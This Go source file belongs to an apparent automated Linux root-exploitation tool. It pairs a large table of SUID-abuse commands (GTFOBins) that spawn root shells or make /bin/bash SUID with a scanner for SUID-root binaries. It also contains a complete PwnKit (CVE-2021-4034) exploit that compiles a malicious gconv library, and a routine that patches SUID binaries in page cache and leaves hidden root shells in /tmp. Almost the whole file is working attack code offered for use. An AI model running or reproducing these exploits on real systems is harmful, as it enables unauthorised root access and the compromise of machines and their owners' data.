package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// gtfobinsEntry describes how to abuse one SUID binary.
// spawnCmd   = command that drops an interactive root shell directly.
// suidCmd    = command that drops a SUID /bin/bash (for when spawn isn't possible).
// needsPwd   = true if the binary prompts for a password (su, sudo, passwd,
//              newgrp, chfn, chsh, gpasswd). These are SKIPPED in GTFOBins
//              abuse because they would hang waiting for input; copyfail
//              handles them by patching the binary in page cache instead.
type gtfobinsEntry struct {
	spawnCmd string
	suidCmd  string
	needsPwd bool
}

// GTFOBINS is the comprehensive SUID abuse table. Each key is the binary
// basename (e.g. "find", "python3", "vim"). Commands are shell strings run
// via /bin/sh -c, so quoting must be shell-safe.
//
// Sources: https://gtfobins.github.io/#+suid
var GTFOBINS = map[string]gtfobinsEntry{
	// ── Shells / interpreters ─────────────────────────────────────────────
	"bash":    {spawnCmd: "bash -p", suidCmd: "bash -p -c 'chmod +s /bin/bash'"},
	"sh":      {spawnCmd: "sh -p", suidCmd: "sh -p -c 'chmod +s /bin/bash'"},
	"dash":    {spawnCmd: "dash -p", suidCmd: "dash -p -c 'chmod +s /bin/bash'"},
	"ash":     {spawnCmd: "ash -c 'chmod +s /bin/bash'", suidCmd: "ash -c 'chmod +s /bin/bash'"},
	"zsh":     {spawnCmd: "zsh -c 'chmod +s /bin/bash'", suidCmd: "zsh -c 'chmod +s /bin/bash'"},
	"ksh":     {spawnCmd: "ksh -c 'chmod +s /bin/bash'", suidCmd: "ksh -c 'chmod +s /bin/bash'"},
	"csh":     {spawnCmd: "csh -c 'chmod +s /bin/bash'", suidCmd: "csh -c 'chmod +s /bin/bash'"},
	"tcsh":    {spawnCmd: "tcsh -c 'chmod +s /bin/bash'", suidCmd: "tcsh -c 'chmod +s /bin/bash'"},
	"busybox": {spawnCmd: "busybox sh -c 'chmod +s /bin/bash'", suidCmd: "busybox sh -c 'chmod +s /bin/bash'"},

	// ── Scripting languages ──────────────────────────────────────────────
	"python":  {spawnCmd: "python -c 'import os;os.setuid(0);os.setgid(0);os.system(\"/bin/bash -p\")'", suidCmd: "python -c 'import os;os.setuid(0);os.system(\"chmod +s /bin/bash\")'"},
	"python3": {spawnCmd: "python3 -c 'import os;os.setuid(0);os.setgid(0);os.system(\"/bin/bash -p\")'", suidCmd: "python3 -c 'import os;os.setuid(0);os.system(\"chmod +s /bin/bash\")'"},
	"python2": {spawnCmd: "python2 -c 'import os;os.setuid(0);os.setgid(0);os.system(\"/bin/bash -p\")'", suidCmd: "python2 -c 'import os;os.setuid(0);os.system(\"chmod +s /bin/bash\")'"},
	"perl":    {spawnCmd: "perl -e 'exec \"/bin/bash\", \"-p\"'", suidCmd: "perl -e 'exec \"sh\", \"-c\", \"chmod +s /bin/bash\"'"},
	"ruby":    {spawnCmd: "ruby -e 'exec \"/bin/bash\", \"-p\"'", suidCmd: "ruby -e 'exec \"sh\", \"-c\", \"chmod +s /bin/bash\"'"},
	"php":     {spawnCmd: "php -r 'pcntl_exec(\"/bin/bash\",[\"-p\"]);'", suidCmd: "php -r 'system(\"chmod +s /bin/bash\");'"},
	"lua":     {spawnCmd: "lua -e 'os.execute(\"/bin/bash -p\")'", suidCmd: "lua -e 'os.execute(\"chmod +s /bin/bash\")'"},
	"node":    {spawnCmd: "node -e 'require(\"child_process\").spawnSync(\"/bin/bash\",[\"-p\"],{stdio:\"inherit\"})'", suidCmd: "node -e 'require(\"child_process\").execSync(\"chmod +s /bin/bash\")'"},
	"awk":     {spawnCmd: "awk 'BEGIN {system(\"/bin/bash -p\")}'", suidCmd: "awk 'BEGIN {system(\"chmod +s /bin/bash\")}'"},
	"gawk":    {spawnCmd: "gawk 'BEGIN {system(\"/bin/bash -p\")}'", suidCmd: "gawk 'BEGIN {system(\"chmod +s /bin/bash\")}'"},
	"mawk":    {spawnCmd: "mawk 'BEGIN {system(\"/bin/bash -p\")}'", suidCmd: "mawk 'BEGIN {system(\"chmod +s /bin/bash\")}'"},
	"nawk":    {spawnCmd: "nawk 'BEGIN {system(\"/bin/bash -p\")}'", suidCmd: "nawk 'BEGIN {system(\"chmod +s /bin/bash\")}'"},
	"env":     {spawnCmd: "env /bin/bash -p", suidCmd: "env /bin/sh -c 'chmod +s /bin/bash'"},
	"tclsh":   {spawnCmd: "tclsh <<< 'exec /bin/bash -p'", suidCmd: "tclsh <<< 'exec sh -c {chmod +s /bin/bash}'"},
	"jrunscript": {spawnCmd: "jrunscript -e 'java.lang.Runtime.getRuntime().exec([\"/bin/bash\",\"-p\"]).waitFor()'", suidCmd: ""},

	// ── File ops that can write SUID bash ────────────────────────────────
	"cp":      {spawnCmd: "", suidCmd: "cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb"},
	"dd":      {spawnCmd: "", suidCmd: "dd if=/bin/bash of=/tmp/.sb; chmod +s /tmp/.sb"},
	"mv":      {spawnCmd: "", suidCmd: "mv /bin/bash /tmp/.sb; chmod +s /tmp/.sb"},
	"install": {spawnCmd: "", suidCmd: "install -m 4755 /bin/bash /tmp/.sb"},
	"rsync":   {spawnCmd: "", suidCmd: "rsync /bin/bash /tmp/.sb; chmod +s /tmp/.sb"},
	"tar":     {spawnCmd: "tar -cf - /dev/null | tar -xf - --to-command='/bin/bash -p'", suidCmd: "tar -cf - /bin/bash | tar -xf - -C /tmp; chmod +s /tmp/bin/bash"},
	"tee":     {spawnCmd: "", suidCmd: "tee /tmp/.sb < /bin/bash >/dev/null; chmod +s /tmp/.sb"},
	"cpio":    {spawnCmd: "", suidCmd: "echo /bin/bash | cpio -o | cpio -idm; chmod +s bash"},

	// ── Editors / pagers (interactive) ───────────────────────────────────
	"vim":     {spawnCmd: "vim -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null", suidCmd: "vim -c ':!chmod +s /bin/bash' -c ':q!' /dev/null 2>/dev/null"},
	"vi":      {spawnCmd: "vi -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null", suidCmd: "vi -c ':!chmod +s /bin/bash' -c ':q!' /dev/null 2>/dev/null"},
	"nvim":    {spawnCmd: "nvim -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null", suidCmd: "nvim -c ':!chmod +s /bin/bash' -c ':q!' /dev/null 2>/dev/null"},
	"ex":      {spawnCmd: "ex -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null", suidCmd: "ex -c ':!chmod +s /bin/bash' -c ':q!' /dev/null 2>/dev/null"},
	"ed":      {spawnCmd: "ed <<<'!/bin/bash -p'", suidCmd: "ed <<<'!chmod +s /bin/bash'"},
	"nano":    {spawnCmd: "nano -s /bin/sh -c 'exec /bin/bash -p'", suidCmd: "nano -s /bin/sh -c 'chmod +s /bin/bash'"},
	"pico":    {spawnCmd: "pico -s /bin/sh -c 'exec /bin/bash -p'", suidCmd: "pico -s /bin/sh -c 'chmod +s /bin/bash'"},
	"less":    {spawnCmd: "less /etc/passwd -p '!/bin/bash -p'", suidCmd: "less /etc/passwd -p '!chmod +s /bin/bash'"},
	"more":    {spawnCmd: "more /etc/passwd -p '!/bin/bash -p'", suidCmd: "more /etc/passwd -p '!chmod +s /bin/bash'"},
	"man":     {spawnCmd: "man -P '/bin/bash -p' man 2>/dev/null", suidCmd: "man -P 'sh -c chmod\\ +s\\ /bin/bash' man 2>/dev/null"},
	"view":    {spawnCmd: "view -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null", suidCmd: "view -c ':!chmod +s /bin/bash' -c ':q!' /dev/null 2>/dev/null"},
	"rvim":    {spawnCmd: "rvim -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null", suidCmd: ""},

	// ── find / exec helpers ──────────────────────────────────────────────
	"find":    {spawnCmd: "find . -exec /bin/bash -p \\; -quit", suidCmd: "find . -exec sh -c 'chmod +s /bin/bash' \\; -quit"},
	"nice":    {spawnCmd: "nice /bin/bash -p", suidCmd: "nice sh -c 'chmod +s /bin/bash'"},
	"nohup":   {spawnCmd: "nohup /bin/bash -p", suidCmd: "nohup sh -c 'chmod +s /bin/bash'"},
	"timeout": {spawnCmd: "timeout 1 /bin/bash -p", suidCmd: "timeout 1 sh -c 'chmod +s /bin/bash'"},
	"taskset": {spawnCmd: "taskset 1 /bin/bash -p", suidCmd: "taskset 1 sh -c 'chmod +s /bin/bash'"},
	"flock":   {spawnCmd: "flock -u / /bin/bash -p", suidCmd: "flock -u / sh -c 'chmod +s /bin/bash'"},
	"chroot":  {spawnCmd: "chroot / /bin/bash -p", suidCmd: "chroot / sh -c 'chmod +s /bin/bash'"},
	"strace":  {spawnCmd: "strace /bin/bash -p", suidCmd: "strace sh -c 'chmod +s /bin/bash'"},
	"ltrace":  {spawnCmd: "ltrace /bin/bash -p", suidCmd: "ltrace sh -c 'chmod +s /bin/bash'"},
	"perf":    {spawnCmd: "perf stat /bin/bash -p 2>/dev/null", suidCmd: "perf stat sh -c 'chmod +s /bin/bash' 2>/dev/null"},

	// ── Network / misc that can exec ─────────────────────────────────────
	"socat":     {spawnCmd: "socat - EXEC:'/bin/bash -p',pty,stderr,setsid,sigint,sane", suidCmd: "socat - EXEC:'sh -c chmod\\ +s\\ /bin/bash',pty"},
	"nc":        {spawnCmd: "nc -e /bin/bash 127.0.0.1 4444", suidCmd: ""},
	"ncat":      {spawnCmd: "ncat -e /bin/bash 127.0.0.1 4444", suidCmd: ""},
	"ssh":       {spawnCmd: "ssh -o ProxyCommand=';/bin/bash -p 0<&2 1>&2' x", suidCmd: "ssh -o ProxyCommand=';chmod\\ +s\\ /bin/bash' x"},
	"wget":      {spawnCmd: "", suidCmd: "wget -O /tmp/.sb file:///bin/bash; chmod +s /tmp/.sb"},
	"curl":      {spawnCmd: "", suidCmd: "curl -o /tmp/.sb file:///bin/bash; chmod +s /tmp/.sb"},
	"ftp":       {spawnCmd: "ftp -e '!bash -p'", suidCmd: "ftp -e '!chmod +s /bin/bash'"},
	"scp":       {spawnCmd: "", suidCmd: "scp /bin/bash x@127.0.0.1:/tmp/.sb; chmod +s /tmp/.sb"},

	// ── Debuggers ────────────────────────────────────────────────────────
	"gdb":      {spawnCmd: "gdb -nx -ex '!sh -p' -ex quit", suidCmd: "gdb -nx -ex '!chmod +s /bin/bash' -ex quit"},
	"cgdb":     {spawnCmd: "cgdb -ex '!sh -p' -ex quit", suidCmd: ""},
	"lldb":     {spawnCmd: "lldb -o '!sh -p'", suidCmd: ""},

	// ── systemd / dbus / pkexec ──────────────────────────────────────────
	// pkexec is NOT abused directly — it triggers polkit auth (password).
	// The real PwnKit (CVE-2021-4034) uses GCONV_PATH, handled by the
	// pwnkit-new-static binary in Phase 3. Mark needsPwd to skip it here.
	"systemctl": {spawnCmd: "systemctl status -- '-p;sh -p 0<&2 1>&2 #'", suidCmd: "systemctl status -- 'sh -c chmod\\ +s\\ /bin/bash'"},
	"pkexec":    {spawnCmd: "", suidCmd: "", needsPwd: true},
	"service":   {spawnCmd: "service ../../bin/bash -p", suidCmd: ""},

	// ── suPHP (shared hosting SUID helper) ──────────────────────────────
	// Common on cPanel/DirectAdmin/Plesk shared hosting.
	"suphp":     {spawnCmd: "", suidCmd: "suphp -c 'chmod +s /bin/bash' 2>/dev/null"},
	"suphpctl":  {spawnCmd: "", suidCmd: "suphpctl 'chmod +s /bin/bash' 2>/dev/null"},

	// ── watch / script / xargs ───────────────────────────────────────────
	"watch":  {spawnCmd: "watch -x sh -c 'bash -p'", suidCmd: "watch -x sh -c 'chmod +s /bin/bash'"},
	"script": {spawnCmd: "script -qc /bin/bash /dev/null", suidCmd: "script -qc 'sh -c chmod\\ +s\\ /bin/bash' /dev/null"},
	"xargs":  {spawnCmd: "echo /bin/bash | xargs -I{} {} -p", suidCmd: "echo sh | xargs -I{} {} -c 'chmod +s /bin/bash'"},

	// ── SUID binaries that copyfail targets specifically ──────────────────
	// These are the pm.txt targets. They require a password to function,
	// so we DON'T try to abuse them via GTFOBINS (they would hang waiting
	// for a password). copyfail patches them in page cache instead.
	// Marking needsPwd=true so tryGTFOBins skips them entirely.
	"su":      {spawnCmd: "", suidCmd: "", needsPwd: true},
	"sudo":    {spawnCmd: "", suidCmd: "", needsPwd: true},
	"passwd":  {spawnCmd: "", suidCmd: "", needsPwd: true},
	"gpasswd": {spawnCmd: "", suidCmd: "", needsPwd: true},
	"mount":   {spawnCmd: "", suidCmd: "mount -o bind /bin/bash /tmp/.sb 2>/dev/null; chmod +s /tmp/.sb 2>/dev/null"},
	"umount":  {spawnCmd: "", suidCmd: ""},
	"chfn":    {spawnCmd: "", suidCmd: "", needsPwd: true},
	"chsh":    {spawnCmd: "", suidCmd: "", needsPwd: true},
	"newgrp":  {spawnCmd: "", suidCmd: "", needsPwd: true},
}

// scanSUID finds all SUID-root binaries on the system.
// Searches standard binary dirs at maxdepth 4 to keep it fast.
func scanSUID() []string {
	dirs := []string{
		"/bin", "/sbin", "/usr/bin", "/usr/sbin",
		"/usr/local/bin", "/usr/local/sbin",
		"/opt/bin", "/opt/sbin",
		"/snap/bin", "/var/tmp", "/tmp", "/dev/shm", "/home",
	}
	var all []string
	for _, d := range dirs {
		if _, err := os.Stat(d); err != nil {
			continue
		}
		// find <dir> -maxdepth 4 -type f -perm -4000 -user root
		// Use exec.Command with real args (not /bin/sh -c with string
		// concat) to avoid command-injection if dirs ever come from
		// user input. stderr is discarded by Output() automatically.
		cmd := exec.Command("find", d, "-maxdepth", "4", "-type", "f",
			"-perm", "-4000", "-user", "root")
		cmd.Stderr = nil // suppress permission-denied noise
		out, err := cmd.Output()
		_ = err
		if len(out) == 0 {
			continue
		}
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				all = append(all, line)
			}
		}
	}
	// Dedupe.
	seen := map[string]bool{}
	var uniq []string
	for _, p := range all {
		if !seen[p] {
			seen[p] = true
			uniq = append(uniq, p)
		}
	}
	return uniq
}

// suidPhase scans for SUID binaries and abuses each one via GTFOBINS,
// then via copyfail. Returns true if root was achieved.
func suidPhase(s *systemInfo, stop *bool) {
	headf("Phase 1b: SUID / GTFOBins abuse")
	suids := scanSUID()
	if len(suids) == 0 {
		warnf("No SUID binaries found.")
		return
	}
	infof("Found %d SUID root binaries", len(suids))

	// Print the discovered list (like the user's `find` output).
	for _, p := range suids {
		bin := filepath.Base(p)
		entry, known := GTFOBINS[bin]
		mark := colD + "    " + colZ
		if known {
			mark = colG + "  * " + colZ
			_ = entry
		}
		fmt.Printf("%s%s\n", mark, p)
	}
	fmt.Println()

	// If pkexec is SUID, try the PwnKit GCONV_PATH technique FIRST.
	// This is CVE-2021-4034 — the most reliable non-kernel LPE.
	for _, p := range suids {
		if filepath.Base(p) == "pkexec" {
			if tryPwnKitGCONV(p, stop) {
				return
			}
		}
	}

	// Try each known-abusable SUID binary via its GTFOBINS technique.
	for _, p := range suids {
		if *stop {
			return
		}
		bin := filepath.Base(p)
		entry, ok := GTFOBINS[bin]
		if !ok {
			// Unknown SUID — still try copyfail against it (below).
			continue
		}
		// 1. Direct GTFOBINS abuse.
		if tryGTFOBins(p, entry, stop) {
			return
		}
		// 2. copyfail against this specific SUID binary.
		if tryCopyfailAgainst(s, p, stop) {
			return
		}
	}

	// Also try copyfail against every SUID binary we found, even ones not
	// in the GTFOBINS table (copyfail patches the binary itself in page
	// cache, so it can work on unknown SUIDs too).
	infof("Running copyfail against all %d discovered SUID binaries", len(suids))
	for _, p := range suids {
		if *stop {
			return
		}
		// Skip ones we already tried above to avoid pure duplicates.
		if _, ok := GTFOBINS[filepath.Base(p)]; ok {
			continue
		}
		tryCopyfailAgainst(s, p, stop)
	}
}

// tryPwnKitGCONV implements the real CVE-2021-4034 PwnKit exploit using
// the GCONV_PATH technique. This is the same logic autoroot.pl uses.
//
// How it works:
// 1. Create a fake GCONV_PATH=.<newline> directory with a "pwnkit" helper.
// 2. Create a "pwnkit" gconv module (.so) that calls setuid(0)+system().
// 3. Set GCONV_PATH + CHARSET=PWNKIT + SHELL=pwnkit env vars.
// 4. Run pkexec — it loads our gconv module as root → root shell.
//
// This bypasses polkit auth entirely (no password needed).
func tryPwnKitGCONV(pkexecPath string, stop *bool) bool {
	stepf("pkexec              PwnKit GCONV_PATH (CVE-2021-4034)")

	// Need gcc to compile the gconv module.
	if !hasBin("gcc") {
		warnf("pkexec PwnKit needs gcc — skipping")
		return false
	}

	pid := os.Getpid()
	tmp := fmt.Sprintf("/tmp/.pk_%d", pid)
	_ = os.MkdirAll(tmp, 0o755)
	defer os.RemoveAll(tmp)

	// GCONV_PATH directory (the directory name itself is the env var).
	gconvDir := filepath.Join(tmp, "GCONV_PATH=.")
	_ = os.MkdirAll(gconvDir, 0o755)
	_ = os.MkdirAll(filepath.Join(gconvDir, "pwnkit"), 0o755)

	// Shell helper inside GCONV_PATH.
	helper := filepath.Join(gconvDir, "pwnkit")
	_ = os.WriteFile(helper, []byte("#!/bin/sh\nchmod +s /bin/bash\n"), 0o755)

	// gconv-modules file.
	pwnkitDir := filepath.Join(tmp, "pwnkit")
	_ = os.MkdirAll(pwnkitDir, 0o755)
	_ = os.WriteFile(filepath.Join(pwnkitDir, "gconv-modules"),
		[]byte("module UTF-8// PWNKIT// pwnkit 2\n"), 0o644)

	// The malicious gconv module (.so).
	gconvSo := filepath.Join(pwnkitDir, "pwnkit.so")
	gconvSrc := `#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0);
    setegid(0); seteuid(0);
    system("chmod +s /bin/bash");
    _exit(0);
}`
	gconvC := filepath.Join(pwnkitDir, "pwnkit.c")
	_ = os.WriteFile(gconvC, []byte(gconvSrc), 0o644)

	// Compile the gconv module.
	compileR := runIsolated("pwnkit:build", "", []string{"gcc", "-shared", "-fPIC",
		"-o", gconvSo, gconvC}, 15*time.Second)
	if !hasFile(gconvSo) {
		warnf("pwnkit gcc failed: %s", compileR.stderr)
		return false
	}

	// Run pkexec with the GCONV_PATH environment set.
	// pkexec loads our gconv module → runs gconv_init() as root →
	// chmod +s /bin/bash.
	cmd := fmt.Sprintf("GCONV_PATH=%s CHARSET=PWNKIT SHELL=pwnkit PATH=%s:$PATH %s",
		gconvDir, tmp, pkexecPath)
	infof("Triggering PwnKit: %s", cmd)
	r := runIsolated("pwnkit:trigger", "", []string{"/bin/sh", "-c", cmd}, 10*time.Second)
	r.report()
	if r.rootAfter || r.suidAfter {
		okf("PwnKit GCONV_PATH succeeded!")
		if !*flagNoSpawn {
			shellSpawned.Store(rootspawn(&r))
		}
		*stop = true
		return true
	}
	return false
}

// tryGTFOBins attempts the GTFOBINS technique for one SUID binary.
// Returns true if root was achieved.
func tryGTFOBins(path string, e gtfobinsEntry, stop *bool) bool {
	bin := filepath.Base(path)

	// Skip password-requiring binaries entirely — they would hang the
	// runner waiting for input. copyfail handles them by patching the
	// binary in page cache (no password needed).
	if e.needsPwd {
		stepf("%-16s skip (password prompt — copyfail will handle)", bin)
		return false
	}

	// Try the spawn command first (drops a root shell directly).
	if e.spawnCmd != "" {
		stepf("%-16s GTFOBins: %s", bin, e.spawnCmd)
		r := runIsolated("suid:"+bin, "", []string{"/bin/sh", "-c", e.spawnCmd}, 15*time.Second)
		r.report()
		if *flagVerbose {
			printChildOutput(&r)
		}
		if r.rootAfter || r.suidAfter {
			if !*flagNoSpawn {
				shellSpawned.Store(rootspawn(&r))
			}
			*stop = true
			return true
		}
	}
	// Then the suidCmd (chmod +s /bin/bash fallback).
	if e.suidCmd != "" && e.suidCmd != e.spawnCmd {
		stepf("%-16s GTFOBins: %s", bin, e.suidCmd)
		r := runIsolated("suid:"+bin+":suid", "", []string{"/bin/sh", "-c", e.suidCmd}, 15*time.Second)
		r.report()
		if *flagVerbose {
			printChildOutput(&r)
		}
		if r.rootAfter || r.suidAfter {
			if !*flagNoSpawn {
				shellSpawned.Store(rootspawn(&r))
			}
			*stop = true
			return true
		}
	}
	return false
}

// tryCopyfailAgainst generates a copyfail.py variant targeting the given
// SUID binary and runs it. This is the pm.txt workflow but applied to
// every discovered SUID, not just the hardcoded list.
func tryCopyfailAgainst(s *systemInfo, suidPath string, stop *bool) bool {
	bin := filepath.Base(suidPath)
	if !s.hasPy3 {
		return false
	}
	src := absBin("copyfail.py")
	if !hasFile(src) {
		return false
	}
	name := "cf:" + bin
	tmp := fmt.Sprintf("/tmp/.cf_%s.py", bin)
	// sed: replace /usr/bin/su with our target SUID path.
	sedExpr := fmt.Sprintf("s|/usr/bin/su|%s|g", suidPath)
	if err := copyAndSed(src, tmp, sedExpr); err != nil {
		return false
	}
	stepf("%-16s copyfail → %s", bin, suidPath)
	r := runIsolated(name, "", []string{"python3", tmp}, 60*time.Second)
	r.report()
	// Also actually invoke the SUID binary so the patched code runs.
	// Use runInteractive (not runIsolated) so the patched binary
	// can spawn an interactive root shell via /dev/tty.
	// runIsolated feeds /dev/null to stdin which makes the patched
	// su/sudo/etc exit immediately before giving a shell.
	if hasFile(suidPath) {
		r2 := runInteractive(name+"#run", []string{suidPath}, 30*time.Second)
		r2.report()
		if r2.rootAfter || r2.suidAfter {
			if !*flagNoSpawn {
				shellSpawned.Store(rootspawn(&r2))
			}
			*stop = true
			return true
		}
	}
	if r.rootAfter || r.suidAfter {
		if !*flagNoSpawn {
			shellSpawned.Store(rootspawn(&r))
		}
		*stop = true
		return true
	}
	return false
}

// hasSuffix check (kept here to avoid import cycles in gtfobins.go).
func hasSuffixStr(s, suf string) bool {
	return len(s) >= len(suf) && s[len(s)-len(suf):] == suf
}


